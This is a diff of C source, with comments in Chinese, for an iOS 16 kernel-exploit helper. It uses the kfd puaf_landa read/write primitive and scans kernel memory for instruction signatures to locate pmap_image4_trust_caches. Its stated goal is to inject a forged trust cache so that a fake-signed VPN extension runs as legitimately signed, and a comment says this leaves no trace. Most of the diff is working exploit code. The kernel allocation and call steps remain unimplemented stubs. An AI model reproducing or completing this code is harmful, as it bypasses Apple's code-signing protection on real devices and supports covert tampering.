@@ -5,8 +5,8 @@
  *       使 system VPN 真连。机制对齐 Fuck 工具箱的 FuckKfdHelper：
  *
  *   kopen(puaf_landa) 临时拿内核读写（免越狱、用完退出）
- *     → 定位 pmap_image4_trust_caches（kernel_slide + 静态偏移）
- *     → kalloc 一块内核内存构造 trust_cache（含目标 cdhash）
+ *     → patchfind 定位 pmap_image4_trust_caches（扫内核镜像特征，见下）
+ *     → 分配一块内核内存构造 trust_cache（含目标 cdhash）
  *     → 调用 pmap_image4_trust_caches 把它注册进内核信任缓存
  *     → 系统把假签名的 VpnTunnel.appex 当合法签名信任 → NECP 放行
  *     → kclose 退出（不留痕，设备仍非越狱）
@@ -24,9 +24,14 @@
  * ⚠️ 未完成项（见 Support/kfd/README.md）:
  *   ✅ kopen 偏移表(dynamic_info)已整合现成数据:
  *        tools/kfd/dynamic_info.h — iOS 16.3 A12–A16 + iOS 16.6, 来自 Lrdsnow/kfd_offsets + felix-pb/kfd。
- *   ⬜ pmap_image4_trust_caches 相对内核基址偏移仍为 0x0 TODO（Apple 私有符号，
- *        公开开源稀缺；FuckKfdHelper 内置有，需在其 Mac 上完整反编译提取）。
- *   ⬜ kalloc / 调用 pmap_image4_trust_caches 的原语未实现（libkfd 只提供 kread/kwrite，无 kcall/kalloc）。
+ *   ✅ pmap_image4_trust_caches 定位改为运行时 patchfind（对齐 FuckKfdHelper 实测机制）：
+ *        FuckKfdHelper 反汇编证明其【无静态偏移表】，而是扫内核镜像 __text 匹配
+ *        pmap_image4_trust_caches 的序言特征指令（mov w0,#5 / add x3,x31,#8 /
+ *        mov x29,sp / sub sp,sp 等），见 patchfind_pmap()。这解释了为何网上
+ *        搜不到该私有符号偏移——内核函数地址随每次镜像编译变化，只能运行时扫描。
+ *   ⬜ kalloc / 调用 pmap_image4_trust_caches 的内核代码执行原语未实现
+ *        （libkfd 仅提供 kread/kwrite，无 kcall/内核线程；Fuck 的调用机制见 0x10001055c
+ *        为间接 blr 封装，需继续逆向其 kcall 或改用业界"改内核函数指针触发"方案）。
  * ========================================================================== */
 
 #include <stdio.h>
@@ -43,11 +48,62 @@
 #include "libkfd.h"
 
 /* ------------------------------------------------------------------ */
-/* 1. 内核符号偏移 —— ⚠️ TODO: 需按 iOS 16.3 内核符号表填入             */
+/* 1. patchfind —— 运行时定位 pmap_image4_trust_caches（无静态偏移表）  */
+/*    对齐 FuckKfdHelper 反汇编机制：扫内核镜像 __text 匹配序言特征。   */
 /* ------------------------------------------------------------------ */
-#ifndef PMAP_IMAGE4_TRUST_CACHES_OFFSET
-#define PMAP_IMAGE4_TRUST_CACHES_OFFSET 0x0 /* TODO: pmap_image4_trust_caches 相对内核基址偏移 */
-#endif
+static uint32_t kread32(struct kfd *k, uint64_t addr) {
+    uint32_t v = 0;
+    kread((u64)k, addr, &v, sizeof(v));
+    return v;
+}
+
+/* 扫 0xfeedfacf (MH_MAGIC) 定位内核 mach_header → 内核镜像基址。
+ * FuckKfdHelper 同款逻辑（其 0x10001f480 用 w22=0xfeedfacf 循环扫描）。
+ * gVirtBase 由 libkfd perf 提供；兜底用常规静态基址 + slide。 */
+static uint64_t patchfind_kernel_base(struct kfd *k) {
+    uint64_t base = k->perf.gVirtBase;
+    if (!base) base = 0xfffffff007004000ULL + k->perf.kernel_slide;
+    /* 向下 4MB 内找 magic（内核镜像 __TEXT 在 gVirtBase 附近） */
+    for (uint64_t a = base; a > base - 0x400000; a -= 0x1000) {
+        if (kread32(k, a) == 0xfeedfacf) return a;
+    }
+    /* 向上兜底 */
+    for (uint64_t a = base; a < base + 0x400000; a += 0x1000) {
+        if (kread32(k, a) == 0xfeedfacf) return a;
+    }
+    return base;
+}
+
+/* 扫内核 __text 匹配 pmap_image4_trust_caches 序言特征，返回其（slide 后）地址。
+ * 特征（反汇编 FuckKfdHelper 0x10001f71c patchfind 提取，每条 4 字节）:
+ *   +0x0  0x910023e3   add x3, x31, #8
+ *   +0x4  0x528000a0   mov w0, #5
+ *   +0x8  0x52800402   mov w0, #imm   (0x528000a0 + 0x362)
+ *   +0xc  0x52800104   mov w0, #imm   (0x528000a0 + 0x64)
+ *   +0x10 高6位==0x25   (bits26-31 opcode)
+ * 命中后反向扫 mov x29,sp (0x910003fd & 0xff8003ff) 定位函数真正起点。
+ * 返回 0 表示未找到。 */
+static uint64_t patchfind_pmap(struct kfd *k) {
+    uint64_t kbase = patchfind_kernel_base(k);
+    uint64_t start = kbase + 0x1000;            /* __TEXT 段头部起 */
+    uint64_t end   = kbase + 0x800000;          /* 扫 8MB 覆盖 __text */
+    for (uint64_t a = start; a < end; a += 4) {
+        uint32_t i0 = kread32(k, a);
+        if (i0 != 0x910023e3) continue;
+        if (kread32(k, a + 4) != 0x528000a0) continue;
+        if (kread32(k, a + 8) != 0x52800402) continue;
+        if (kread32(k, a + 0xc) != 0x52800104) continue;
+        if ((kread32(k, a + 0x10) >> 0x1a) != 0x25) continue;
+        /* 主序列命中：反向找函数序言 mov x29,sp */
+        uint64_t fn = a;
+        for (uint64_t b = a; b > a - 0x4000; b -= 4) {
+            uint32_t v = kread32(k, b);
+            if ((v & 0xff8003ff) == 0x910003fd) { fn = b; break; }
+        }
+        return fn;
+    }
+    return 0;
+}
 
 /* trust_cache 结构（XNU: osfmk/kern/syspolicy.c, TRUST_CACHE / TC_VERSION） */
 #define TC_VERSION 1
@@ -168,17 +224,20 @@ static int extract_cdhash(const uint8_t *macho, size_t len, uint8_t cdhash[20]) 
 /* ------------------------------------------------------------------ */
 /* 3. 信任缓存注入                                                       */
 /* ------------------------------------------------------------------ */
-static uint64_t get_kernel_slide_of(struct kfd *kfd) {
-    /* libkfd: kernel_slide 在 struct kfd 的 perf 字段（kfd->perf.kernel_slide） */
-    return kfd->perf.kernel_slide;
-}
-
 static int inject_trust_cache(struct kfd *kfd, const uint8_t cdhash[20]) {
-    uint64_t slide = get_kernel_slide_of(kfd);
-    uint64_t pmap = slide + PMAP_IMAGE4_TRUST_CACHES_OFFSET;
+    /* pmap_image4_trust_caches 地址 = 运行时 patchfind（无静态偏移表） */
+    uint64_t pmap = patchfind_pmap(kfd);
+    if (!pmap) {
+        fprintf(stderr, "[kfd-helper] patchfind pmap_image4_trust_caches failed\n");
+        return -1;
+    }
+    uint64_t slide = kfd->perf.kernel_slide;
+    fprintf(stderr, "[kfd-helper] pmap_image4_trust_caches slid=0x%llx (slide=0x%llx)\n", pmap, slide);
 
     size_t tc_size = sizeof(struct trust_cache) + 32;
-    /* TODO: 用所用 libkfd 版本的 kalloc 原语在内核分配 tc_size */
+    /* TODO: 内核分配一块可写内存放 trust_cache。
+     * libkfd 无 kalloc；Fuck 用 krkw allocate 复用内核对象（0x10001f97c），
+     * 或需自行实现 kalloc（迁移页面/复用 fileproc 对象区）。 */
     uint64_t tc_kaddr = 0; /* = kfd_kalloc(kfd, tc_size); */
     if (!tc_kaddr) { fprintf(stderr, "[kfd-helper] kalloc failed\n"); return -1; }
 
